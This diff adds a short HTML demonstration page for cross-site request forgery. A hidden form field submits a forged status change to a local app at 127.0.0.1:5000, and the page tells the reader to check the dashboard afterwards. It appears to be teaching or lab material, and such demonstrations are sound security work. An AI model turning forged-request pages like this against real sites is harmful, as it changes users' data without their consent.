@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CSRF Demo Page</h2>
+
+    <form action="http://127.0.0.1:5000/dashboard/update_status" method="POST">
+      <input type="hidden" name="status" value="CSRF changed this status">
+      <button type="submit">Click to submit forged request</button>
+    </form>
+
+    <p>After clicking, go back to your dashboard and refresh to see the status changed.</p>
+  </body>
+</html>
